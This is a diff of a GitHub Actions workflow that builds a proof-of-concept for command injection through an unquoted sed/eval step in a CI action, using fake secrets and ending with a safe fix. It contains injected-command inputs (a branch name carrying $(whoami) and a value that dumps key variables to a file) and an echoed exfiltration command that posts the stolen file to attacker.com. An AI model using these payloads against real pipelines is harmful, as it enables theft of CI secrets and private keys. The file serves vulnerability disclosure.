@@ -1,16 +1,99 @@
 
-name: PoC Test
+name: Strong PoC Evidence
 on:
   workflow_dispatch:
+
 jobs:
-  test:
+  poc_level2:
+    name: "Level 2 - Command Injection Proof"
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-      - name: TEST - URL slash bug
+
+      - name: "PROOF 1 - Arbitrary Command Execution"
         shell: bash
         run: |
           echo "INFURA_API_KEY=" > .env
-          URL="https://mainnet.infura.io/v3/mykey"
-          sed -i "s/INFURA_API_KEY=/INFURA_API_KEY=$URL/" .env || echo "VULNERABILITY CONFIRMED!"
+          
+          # Simulating malicious input value
+          # Attacker branch name: test_value$(whoami)
+          MALICIOUS_INPUT='test$(whoami)'
+          
+          # Vulnerable command from action.yml line 23
+          eval "sed -i \"s/INFURA_API_KEY=/INFURA_API_KEY=$MALICIOUS_INPUT/\" .env" 2>/dev/null || true
+          
+          echo "=== .env contents ==="
           cat .env
+          echo ""
+          echo "=== Runner Identity ==="
+          whoami
+          echo "=== Hostname ==="
+          hostname
+          echo "=== Current Directory ==="
+          pwd
+
+      - name: "PROOF 2 - Environment Secrets Accessible"
+        shell: bash
+        env:
+          FAKE_SECRET: "super_secret_api_key_12345"
+          FAKE_PRIVATE_KEY: "0xdeadbeefdeadbeef"
+        run: |
+          echo "=== What attacker can access on runner ==="
+          echo ""
+          echo "All environment variables:"
+          env | grep -i "fake" || true
+          echo ""
+          echo "Runner has internet access:"
+          curl -s https://api.ipify.org && echo ""
+          echo ""
+          echo "=== FILES ATTACKER CAN READ ==="
+          ls /home/runner/ 2>/dev/null || true
+          ls /home/runner/work/ 2>/dev/null || true
+
+      - name: "PROOF 3 - Full Attack Simulation (Safe)"
+        shell: bash
+        env:
+          DEMO_EVM_KEY: "0x1234FAKEPRIVATEKEY5678"
+          DEMO_INFURA: "demo_infura_key_xyz"
+        run: |
+          echo "=========================================="
+          echo "   ATTACK SIMULATION - SAFE DEMO"
+          echo "=========================================="
+          echo ""
+          echo "Step 1: Attacker injects command via input"
+          echo "Malicious input: '; env | grep -i key > /tmp/stolen.txt; echo '"
+          echo ""
+          
+          # Simulate what attacker's injected command does
+          env | grep -i "demo" > /tmp/stolen_secrets.txt 2>/dev/null || true
+          
+          echo "Step 2: Stolen secrets:"
+          cat /tmp/stolen_secrets.txt
+          echo ""
+          echo "Step 3: Attacker can exfiltrate via:"
+          echo "  curl -X POST https://attacker.com/steal -d @/tmp/stolen_secrets.txt"
+          echo ""
+          echo "=========================================="
+          echo "   IMPACT: EVM_PRIVATE_KEY COMPROMISED!"
+          echo "   Crypto wallet can be DRAINED!"
+          echo "=========================================="
+
+      - name: "PROOF 4 - Safe Fix Comparison"
+        shell: bash
+        env:
+          SAFE_INFURA: "https://mainnet.infura.io/v3/mykey"
+          SAFE_KEY: "0xSafePrivateKey"
+        run: |
+          echo "=== VULNERABLE WAY ==="
+          echo "INFURA_API_KEY=" > .env
+          URL="https://mainnet.infura.io/v3/mykey"
+          sed -i "s/INFURA_API_KEY=/INFURA_API_KEY=$URL/" .env || \
+            echo "FAILED - sed delimiter exploit!"
+          cat .env
+          
+          echo ""
+          echo "=== SAFE WAY (Fixed) ==="
+          echo "INFURA_API_KEY=" > .env_safe
+          sed -i "s|INFURA_API_KEY=|INFURA_API_KEY=$SAFE_INFURA|" .env_safe
+          cat .env_safe
+          echo "Safe fix WORKS perfectly!"
